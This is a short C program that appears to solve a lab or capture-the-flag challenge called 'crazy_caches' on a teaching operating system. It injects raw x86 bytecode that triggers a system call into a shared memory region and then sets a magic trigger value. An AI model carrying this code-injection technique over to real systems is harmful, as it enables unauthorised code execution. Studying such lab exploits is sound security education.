#include "userlib.h"

#define PROC_VIRT_ADDR ((0x08048000))
#define MMAP_VIRT_ADDR ((0x0D048000))

int memcpy(char *to, char *from, size_t nbytes) {
	int i = 0;
	for (i = 0; i < nbytes; i++) {
		to[i] = from[i];
	}
	return nbytes;
}

char buf[1024];

int main () {
	int32_t *mmap_region = (int32_t*)MMAP_VIRT_ADDR;
	swrite(0, "Solving crazy_caches\n");
	
	int *code_region = (int *)mmap_region + 0x100;
	snprintf(buf, sizeof(buf), "code_region: %x\n", code_region);
	swrite(0, buf);

	char bytecode[] = {0xbb, 0x02, 0x00, 0x00, 0x00, 0xb8, 0x0c, 0x00, 0x00, 0x00, 0xcd, 0x80, 0xc3};
	memcpy((char *)code_region, (char *)bytecode, sizeof(bytecode));

	*mmap_region = 0xdeadc0de;

	return 0;
}